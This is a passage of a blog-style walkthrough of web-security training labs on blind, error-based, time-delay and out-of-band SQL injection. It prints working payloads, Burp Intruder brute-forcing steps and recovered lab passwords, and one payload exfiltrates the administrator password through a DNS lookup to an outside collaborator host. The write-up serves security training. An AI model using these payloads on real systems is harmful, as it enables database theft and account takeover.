![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/04a6f38a-8f0d-4da9-a2a0-07d4c46f53b4)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f54ac41a-0533-4819-ac3e-02a08f76676d)

From the above screenshot, we can easily tell the the length of the password is ```20```.

Now, lets go ahead and extract the password. We can use this query
```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e541fbcd-3473-45de-aae7-0011903f29f4)

We can see it didn't return an error, this means the string isn't the first character of the password.

Lets use burp intruder to bruteforce this instead of testing it one by one. 

Send the request from burp repeater to burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e27b3077-753f-47a0-ad41-8a9e440a6d62)

highlight the ```a``` and click on ```add```, leave the attack type as ```sniper```. After doing all these, you should have something like this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/017ecdfb-7813-4345-9a0f-fa9c318f5235)

Now, click on payloads. You should get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/42d643df-d2af-40f8-b37a-050d9464bdcd)

Editing this,

we'll assume that the password contains only lowercase alphanumeric characters. So, we'll add the payloads in the range a - z and 0 - 9

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3d0c607-b4e5-477c-b8d2-dc8eea37c67b)

Click on "start attack"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fcbc3a96-7016-4364-94c2-82d32d555802)

We got our first character

Getting the 2nd character we can use the query
```sql
'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
Using burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb38bbe6-15e0-4749-9d5a-9ec12ddd5cd0)

starting the attack

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/054e4b2b-3b3e-4d91-85b1-fe2e65f184c7)

We got the 2nd character

Getting the 3rd character, we can use the query
```sql
'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
Using burp inruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/464d0ccd-fa77-488b-9480-97826b4a5ead)

Starting the attack

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28a17af0-9a5f-4f74-9cc3-0c6eb1c3be47)

We got the 3rd character

Getting the 4th character, we can use the query
```sql
'||(SELECT CASE WHEN SUBSTR(password,4,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
Using burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/255fcc6f-b878-4904-b425-caf8238b6c39)

Starting the attack

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0c8c5388-56fd-4a93-a007-9b5590e558fe)

We got the 4th character

Getting the 5th character, we can use the query
```sql
'||(SELECT CASE WHEN SUBSTR(password,5,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
Using burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fcaa47d7-05cc-4845-ae42-8e23e7293cb8)

Starting the attack

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/615d3d46-40bf-4125-9c08-22fc5547b78f)

We got the 5th character

We can continue this process, until we get to the 20th character(since we already know the password length to be 20). We can use the query
```sql
'||(SELECT CASE WHEN SUBSTR(password,20,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
Using burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/732b7856-607d-4ce4-aa6e-c0f2b24b9d12)

Starting the attack

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cad01836-070e-44b4-87b9-4e8044010fb9)

We got the 20th character.

So, I got the password to be ```b7dj6cx48d5qx0yzg7ld```, lets use this password to log in as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b8381c4-8b8b-4f3b-8d5c-b8bab13c0d6d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1c14a3fd-16cb-4a20-859c-47f08e06a38e)

Cool stuff, we have completed the task for this lab,

-------------------

# Visible error-based SQL injectionVisible error-based SQL injection
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/87eabdef-bcb7-41f7-8f58-1d4821881ff5)

Navigate to the webpage and click on "View datails"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/402a9db4-1dc5-455d-b985-afe5c282e2f5)

Capturing the request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/70a5c570-6a89-4245-82ec-2740b9d3c416)

Lets try to trigger a sql error using the ```'``` symbol

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8f697e9-b30c-48a5-87e3-27352c9532df)

You can see we got the error "Unterminated string lateral", if you also observed an extra character ```'``` got added to the cookie section. So, lets try to comment that out using ```--```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb83a6c1-605e-463a-be89-d4612f7fea0c)

cool, you can see we didn't get an error, so this means we've got the right query.

Now, lets try to use the ```CAST()``` function
```sql
' AND CAST((SELECT 1) AS int)--
```
Ensure this is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ea53d2ea-d3ca-489e-9b44-da66f0b73970)

From the error we have to make the argument ```AND``` boolean. We can solve that using this query
```sql
' AND 1=CAST((SELECT 1) AS int)--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e5450682-296a-4a49-a0ad-e77e020d97e1)

you can see we didn't get any error

Since we were told that there is a table called ```users``` with columns ```username``` and ```password```. Also, there is a username ```administrator```

We can use this query to check for users
```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b1a8f6f4-ad6a-4d69-9422-bc0ccfe1264e)

We get another error, so there seems to be a character limit here. To get this solved, lets delete the value of the ```TrackingId```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58d0b5c4-0203-4f4d-b9f9-8932fb3778d4)

We get another error telling us that our query returned more than one row. Modifying the query to return just one row, we can use the query
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
Using this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/93e71885-2497-49e0-9037-17be8da140fa)

cool, we got the first username in the ```users``` table to be administrator. Lets go ahead and leak the password hehe

This  query will help us with that
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9deb7d91-e7bd-421d-aea0-ee8e80fb87e5)

Cool, we got the password of the administrator user to be ```zyxtiwdkhp96r63vsz5m```.

Now, lets go ahead and login as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/70eb9961-3417-4be5-bb90-c629aa234951)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d88a94ea-d801-447d-b03d-288bb8b62b02)

Nice, we have successfully solved this lab

--------------------------

# Blind SQL injection with time delays
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/69723393-4fdc-42f0-b4bc-8485f4cda63b)

Navigate to the webpage and click on "View details"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73707d68-58aa-40bb-8b01-64b078cad938)

Capturing the request and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f09aa96-f85e-45d8-be1d-181b05236393)

To trigger a 10 seconds delay, we can use the query
```sql
'|| pg_sleep(10)--
```
Ensure the query is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e708a78-6798-48cb-b97e-13f3305b9887)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1d0e3f32-a9da-49c8-8254-b7d5dc9a0f2b)

Cool, we have successfully completed the task for this lab

-------------------

# Blind SQL injection with time delays and information retrieval
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6645cebd-6934-4453-b308-3cf4ce3fa2d3)

Navigate to the webpage and click on "View details"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8c35d3d3-5220-4d2b-82c4-c9358c1ab89d)

Captutring this request and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/faf3126c-369d-46fc-953d-93b3c52295f9)

Lets start by triggering a 10s delay
```sql
'|| pg_sleep(10)--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0fb5e6d2-79d8-4d0b-9341-44877c6f051b)

Alright, cool we were able to trigger a 10 seconds delay

We know the table name to be ```users```, the column names are ```username``` and ```password```, then the name of the user is ```administrator```

But lets try to confirm if there really is a username ```administrator```, we can use the query
```sql
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
Ensure the query is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6625acec-7d8b-4179-b35c-11701302d474)

Now that we've confirmed that the username is present in the database. Lets check the length of the password. We can use the query
```sql
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/723afd8b-e12f-4719-8b85-424acbd899fc)

This confirmed that the password is greater than 1

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73a2fd2d-f571-47c9-a745-6593a4874f71)

This screenshot confirmed that the length of the passowrd to be 20

Now that we know the length of the password lets start extracting the characters one by one. We'll be inviting burp intruder to the party. We can use the query
```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
Lets assume the password characters to be lowercase alphanumeric characters.

using the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/20ecdea7-5e59-45a9-957b-0626d6897aa5)

We didn't get the 10s delay which means ```m``` isn't the first character of the password.

Trying the other characters,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7b8ab0b1-1e9f-4c64-ba9f-a81385118c87)

I got the first character of the password to be ```7```

To get the second character, we can use the query
```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f0ff61d3-bbee-4282-851a-f656ea76bd9a)

I got the second character of the password to be ```v```

To get the third character of the password, you can use the query
```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,3,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e586247d-1e05-4475-a4c3-a8dfb5239f97)

I got the third character of the password to be ```3```.

This process can be continued until we get to the 20th password character

To get the 20th character, you can use the query
```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,20,1)='h') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c156b5a6-778f-4afc-9a5f-6488dc9ddf6f)

I got the last password to be ```h```.

I got the full password to be ```7v3zmmujptl7r634bjlh```. Now, lets go ahead and log in as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/72466b83-df39-4980-9a70-ca03b0c9bec4)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b7fbcf4-4264-4770-919f-51532aab34ad)

cool stuff, we have successfully solved this lab

----------------------

# Blind SQL injection with out-of-band interaction
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e8644200-5108-4986-bb0d-5ebd2736260b)

Navigate to the webpage and click on "View details"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/152a078f-a338-4a71-88f1-c9a5a6cd3517)

Capturing the request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fb8fd3f-418a-4a30-b9c6-b3f8bcd55b62)

To trigger out-of-band interaction with burp collaborator, we can use the query
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```
To get the payload from burp collaborator client

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4554ade9-c4a0-4794-a789-fd0aad82fab7)

Now, lets paste this query using the payload we got from burp collaborator client
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://8cllzq3qnv0bxuz5k1o5wgeokfq6ev.oastify.com/"> %remote;]>'),'/l') FROM dual--
```
Ensure the query is url encoded

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/08c0d005-f261-468c-a8bb-8ccba81224c9)

Cool, we were ale to achieve dns lookup. 

Going back to our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dcf28cd-c117-4f06-bb0f-952369a09f8d)

We have successfully solved this lab.

-----------------------------

#  Blind SQL injection with out-of-band data exfiltration
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6fcf547f-1c14-47f4-a477-62d205b37541)

Navigate to the webpage and click on "View details"

Capturing the request and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9b80a97-9087-4069-9aee-9af5a1e740f9)

We'll be using burp collaborator client for this task since we were given the table name to be ```users``` and the column names to be ```username``` and ```password```, we also have the username to be ```administrator``` so all we need is the password of the admin user

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.0tu71gj5zpi129crwrp9uf5rlir9fy.oastify.com/"> %remote;]>'),'/l') FROM dual--
```
Replace ```0tu71gj5zpi129crwrp9uf5rlir9fy.oastify.com``` with the payload you got from your burp collaborator

Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11a4b8ea-997f-4f7e-91d3-1458dd1b109c)

Checking Burp Collaborator Client, click on "poll now", you should get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/349b4a04-46f4-4159-81fd-cb5a747852d9)

Take a look at the domain name, the payload we got from burp collaborator client was ```0tu71gj5zpi129crwrp9uf5rlir9fy.oastify.com``` but we got something different for the domain name

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/442ab0da-8164-4a9c-9daf-5aeead10ef08)

The password for the administrator user is the set of alphanumeric characters before the payload. So ```pfohk2cgqxm2ktuoer65``` is the administrator password. Lets go ahead and login as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ce456371-8a8c-44e8-8ad2-df381f15bbe6)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/09a5544e-c65d-4191-be21-175270e1d9b4)

We have successfully solved the lab😎

----------------------------

# SQL injection with filter bypass via XML encoding
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/06dcb941-e80a-4fe1-b119-d00db360ef23)

Navigate  to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/02b4b2fd-a8e2-42a4-8bd6-fc1b51cf4389)

click on stock and capture the request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62db20ee-af3f-4712-b5ba-d93daf4e8fa0)

So, we have a table ```users``` and columns ```username``` and ```password```

Checking the hint we were given

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d85cab1f-f7d2-48ef-8c61-5b4893f4aebd)

Let's try to download this extension

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7ef6884c-5b8d-448a-9831-0b1371bb882c)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e7503e1d-b70f-49a0-808f-a1041c02cc26)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5ef26695-e7ea-4a16-a489-5654fac4f4c7)

We are done installing it. We'll be using this query to dump the contents of the database
```sql
1 UNION SELECT username || ':' || password FROM users
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/70b8be0e-f7a6-45d6-abc9-d297c9de243e)

our attack got detected, lets encode this using the ```hackvertor``` extension we just installed. To do this
just highlight the query, right-click, then select Extensions > Hackvertor > Encode > dec_entities

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d22dbaa9-2d62-49f3-a6e1-f84735e4df0b)

We have successfully dumped the contents of the database. Lets go ahead and login as the administrator user

username:```administrator```        password:```hhkovl3d48vch2ix840b```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0a8d4a40-4ea6-44cd-905d-09f3f9ef2a9c)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f406a392-5f46-447d-9aa0-965b654511fd)

We have successfully completed this lab😎

---------------------------------

Till Next Time :xD

<br><br>
[Back To Home](../../index.md)






















